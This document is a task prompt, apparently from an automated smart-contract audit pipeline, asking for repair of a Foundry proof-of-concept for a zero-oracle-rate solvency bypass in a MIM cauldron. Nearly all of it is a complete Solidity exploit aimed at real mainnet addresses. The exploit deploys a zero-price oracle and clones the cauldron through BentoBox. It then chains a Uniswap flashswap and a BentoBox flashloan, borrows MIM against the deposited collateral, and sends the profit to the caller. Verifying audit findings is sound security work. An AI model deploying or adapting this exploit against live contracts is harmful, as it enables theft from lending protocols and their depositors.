You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Zero oracle rates are accepted and make any borrower with nonzero collateral appear solvent
- claim: Neither `init()` nor `updateExchangeRate()` validates that the oracle returned success or that the returned rate is nonzero before storing or using it. If the cached `exchangeRate` becomes zero, `_isSolvent()` reduces the debt side of the solvency inequality to zero, so any account with positive collateral passes solvency checks, and `liquidate()` also stops treating those borrowers as insolvent.
- impact: During a zero-rate oracle event, users can post dust collateral, borrow out the cauldron's MIM, and remain effectively unliquidatable until a valid price is restored.
- exploit_paths: ["At initialization, `oracle.get()` can return `(false, 0)` or another zero rate and the clone stores `exchangeRate = 0` without reverting.", "Later, a user borrows through `borrow()` or `cook(ACTION_BORROW, ...)`; the post-action solvency check uses the zero cached rate, so the position is accepted despite being deeply undercollateralized."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOracleLike {
    function get(bytes calldata data) external returns (bool, uint256);
}

interface ICauldronLike {
    function bentoBox() external view returns (address);
    function exchangeRate() external view returns (uint256);
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
    function isSolvent(address user) external view returns (bool);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(IFlashBorrowerLike borrower, address receiver, address token, uint256 amount, bytes calldata data)
        external;
    function deploy(address masterContract, bytes calldata data, bool useCreate2) external payable returns (address cloneAddress);
    function masterContractOf(address cloneAddress) external view returns (address masterContract);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ZeroOracle is IOracleLike {
    function get(bytes calldata) external pure returns (bool, uint256) {
        return (false, 0);
    }
}

contract FlawVerifier is IFlashBorrowerLike {
    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ADD_COLLATERAL = 10;

    address public constant TARGET_CAULDRON = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    ICauldronLike public constant TARGET = ICauldronLike(TARGET_CAULDRON);

    error Unauthorized();
    error SetupFailed(string reason);
    error ExecutionFailed(string reason);

    uint256 internal constant AUXILIARY_DIVISOR = 20;
    uint256 internal constant BENTO_FLASH_DIVISOR = 5;
    uint256 internal constant PAIR_RESERVE_DIVISOR = 2;

    uint256 internal _profitAmount;
    bool internal _executed;

    address public vulnerableCauldron;
    address public zeroOracle;
    address public selectedPair;
    address public selectedQuoteToken;
    address public profitReceiver;

    uint256 public flashAmount;
    uint256 public auxiliaryAmount;
    uint256 public pairRepayAmount;
    uint256 public bentoFlashFee;
    uint256 public depositedAmount;
    uint256 public depositedShare;
    uint256 public borrowedAmount;
    uint256 public borrowedPart;
    uint256 public borrowedShare;
    bool public hypothesisValidated;
    bool public usedInitZeroRatePath;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return MIM;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external returns (uint256) {
        return _execute(msg.sender);
    }

    function execute() external returns (uint256) {
        return _execute(msg.sender);
    }

    function exploit() external returns (uint256) {
        return _execute(msg.sender);
    }

    function run() external returns (uint256) {
        return _execute(msg.sender);
    }

    function _execute(address receiver) internal returns (uint256) {
        if (_executed) {
            return _profitAmount;
        }
        _executed = true;
        profitReceiver = receiver;

        _deployVulnerableClone();
        _prepareApprovals();
        _selectLiquidity();

        if (flashAmount == 0 || auxiliaryAmount == 0 || selectedPair == address(0)) {
            revert SetupFailed("NO_WORKING_FLASH_CONFIGURATION");
        }

        address token0 = IUniswapV2PairLike(selectedPair).token0();
        uint256 amount0Out = token0 == MIM ? auxiliaryAmount : 0;
        uint256 amount1Out = token0 == MIM ? 0 : auxiliaryAmount;

        IUniswapV2PairLike(selectedPair).swap(
            amount0Out,
            amount1Out,
            address(this),
            abi.encode(auxiliaryAmount, flashAmount)
        );

        _profitAmount = IERC20Like(MIM).balanceOf(address(this));
        if (_profitAmount == 0) {
            revert ExecutionFailed("NO_REALIZED_PROFIT");
        }

        _safeTransfer(MIM, receiver, _profitAmount);
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender != selectedPair || sender != address(this)) {
            revert Unauthorized();
        }

        uint256 receivedAmount = amount0 != 0 ? amount0 : amount1;
        (uint256 expectedAuxiliary, uint256 expectedFlashAmount) = abi.decode(data, (uint256, uint256));
        if (receivedAmount != expectedAuxiliary || expectedFlashAmount != flashAmount) {
            revert ExecutionFailed("PAIR_CALLBACK_MISMATCH");
        }

        pairRepayAmount = _uniswapRepayAmount(receivedAmount);

        IBentoBoxLike(TARGET.bentoBox()).flashLoan(
            this,
            address(this),
            MIM,
            flashAmount,
            abi.encode(receivedAmount)
        );

        _withdrawAllMimShares();

        if (IERC20Like(MIM).balanceOf(address(this)) < pairRepayAmount) {
            revert ExecutionFailed("INSUFFICIENT_MIM_TO_REPAY_PAIR");
        }
        _safeTransfer(MIM, selectedPair, pairRepayAmount);
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external override {
        if (msg.sender != TARGET.bentoBox() || sender != address(this) || token != MIM) {
            revert Unauthorized();
        }

        uint256 aux = abi.decode(data, (uint256));
        bentoFlashFee = fee;
        if (aux < fee) {
            revert ExecutionFailed("AUXILIARY_FLASH_TOO_SMALL");
        }

        uint256 totalDeposit = amount + aux;

        // The exploit path stays aligned with the finding:
        // 1) initialize a clone so `exchangeRate` caches as zero from a zero-return oracle,
        // 2) post nonzero collateral,
        // 3) borrow via `cook()` and pass the post-borrow solvency check because debt * exchangeRate == 0.
        // The auxiliary public flashswap only covers Bento's flashloan fee; it does not change the bug's causality.
        (, depositedShare) = IBentoBoxLike(TARGET.bentoBox()).deposit(MIM, address(this), vulnerableCauldron, totalDeposit, 0);
        depositedAmount = totalDeposit;
        if (depositedShare == 0) {
            revert ExecutionFailed("ZERO_DEPOSIT_SHARE");
        }

        uint256 borrowableAmount = depositedAmount;
        if (borrowableAmount > 1) {
            borrowableAmount -= 1;
        }

        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = ACTION_ADD_COLLATERAL;
        datas[0] = abi.encode(_toInt256(depositedShare), address(this), true);

        actions[1] = ACTION_BORROW;
        datas[1] = abi.encode(_toInt256(borrowableAmount), address(this));

        (borrowedPart, borrowedShare) = ICauldronLike(vulnerableCauldron).cook(actions, values, datas);
        borrowedAmount = borrowableAmount;

        hypothesisValidated = ICauldronLike(vulnerableCauldron).exchangeRate() == 0
            && ICauldronLike(vulnerableCauldron).userCollateralShare(address(this)) > 0
            && ICauldronLike(vulnerableCauldron).userBorrowPart(address(this)) > 0
            && ICauldronLike(vulnerableCauldron).isSolvent(address(this));

        if (!hypothesisValidated) {
            revert ExecutionFailed("ZERO_RATE_SOLVENCY_BYPASS_NOT_REACHED");
        }
    }

    function _deployVulnerableClone() internal {
        if (vulnerableCauldron != address(0)) {
            return;
        }

        zeroOracle = address(new ZeroOracle());

        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        address master = bento.masterContractOf(TARGET_CAULDRON);
        if (master == address(0)) {
            revert SetupFailed("MISSING_MASTER_CONTRACT");
        }

        bytes memory initData = abi.encode(
            MIM,
            zeroOracle,
            bytes(""),
            uint64(0),
            uint256(112_000),
            uint256(75_000),
            uint256(0)
        );

        vulnerableCauldron = bento.deploy(master, initData, false);
        if (vulnerableCauldron == address(0)) {
            revert SetupFailed("CLONE_DEPLOY_FAILED");
        }
        if (ICauldronLike(vulnerableCauldron).exchangeRate() != 0) {
            revert SetupFailed("INIT_DID_NOT_CACHE_ZERO_RATE");
        }

        usedInitZeroRatePath = true;
    }

    function _prepareApprovals() internal {
        _approveIfNeeded(MIM, TARGET.bentoBox(), type(uint256).max);
    }

    function _selectLiquidity() internal {
        uint256 bestReserve;
        address bestPair;
        address bestQuote;

        (bestPair, bestQuote, bestReserve) = _pickBetterPair(SUSHI_FACTORY, WETH, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(SUSHI_FACTORY, USDC, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(SUSHI_FACTORY, USDT, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(SUSHI_FACTORY, DAI, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(UNISWAP_V2_FACTORY, WETH, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(UNISWAP_V2_FACTORY, USDC, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(UNISWAP_V2_FACTORY, USDT, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(UNISWAP_V2_FACTORY, DAI, bestPair, bestQuote, bestReserve);

        if (bestPair == address(0) || bestReserve == 0) {
            revert SetupFailed("NO_MIM_PAIR_FOUND");
        }

        uint256 bentoBalance = IERC20Like(MIM).balanceOf(TARGET.bentoBox());
        if (bentoBalance == 0) {
            revert SetupFailed("NO_BENTO_MIM_LIQUIDITY");
        }

        uint256 maxFromBento = bentoBalance / BENTO_FLASH_DIVISOR;
        uint256 maxFromPair = bestReserve / PAIR_RESERVE_DIVISOR;
        uint256 candidate = maxFromBento < maxFromPair ? maxFromBento : maxFromPair;
        if (candidate <= AUXILIARY_DIVISOR) {
            revert SetupFailed("FLASH_AMOUNT_TOO_SMALL");
        }

        selectedPair = bestPair;
        selectedQuoteToken = bestQuote;
        flashAmount = candidate;
        auxiliaryAmount = candidate / AUXILIARY_DIVISOR;
        if (auxiliaryAmount == 0) {
            auxiliaryAmount = 1;
        }
    }

    function _pickBetterPair(
        address factory,
        address otherToken,
        address currentBestPair,
        address currentBestQuote,
        uint256 currentBestReserve
    ) internal view returns (address bestPair, address bestQuote, uint256 bestReserve) {
        bestPair = currentBestPair;
        bestQuote = currentBestQuote;
        bestReserve = currentBestReserve;

        (address pair, uint256 reserve) = _pairWithReserve(factory, otherToken);
        if (reserve > bestReserve) {
            bestPair = pair;
            bestQuote = otherToken;
            bestReserve = reserve;
        }
    }

    function _pairWithReserve(address factory, address otherToken) internal view returns (address pair, uint256 mimReserve) {
        pair = IUniswapV2FactoryLike(factory).getPair(MIM, otherToken);
        if (pair == address(0)) {
            return (address(0), 0);
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == MIM) {
            mimReserve = uint256(reserve0);
        } else {
            mimReserve = uint256(reserve1);
        }
    }

    function _withdrawAllMimShares() internal {
        uint256 mimShares = IBentoBoxLike(TARGET.bentoBox()).balanceOf(MIM, address(this));
        if (mimShares != 0) {
            IBentoBoxLike(TARGET.bentoBox()).withdraw(MIM, address(this), address(this), 0, mimShares);
        }
    }

    function _approveIfNeeded(address token, address spender, uint256 amount) internal {
        try IERC20Like(token).allowance(address(this), spender) returns (uint256 allowed) {
            if (allowed >= amount / 2) {
                return;
            }
        } catch {}

        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (!ok || (data.length != 0 && !abi.decode(data, (bool)))) {
            revert ExecutionFailed("APPROVE_FAILED");
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        if (!ok || (data.length != 0 && !abi.decode(data, (bool)))) {
            revert ExecutionFailed("TRANSFER_FAILED");
        }
    }

    function _toInt256(uint256 value) internal pure returns (int256 signed) {
        if (value > uint256(type(int256).max)) {
            revert ExecutionFailed("INT256_OVERFLOW");
        }
        signed = int256(value);
    }

    function _uniswapRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: oracle.get(), exchangerate = 0, oracle.get, borrow(), cook(action_borrow, ...)
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
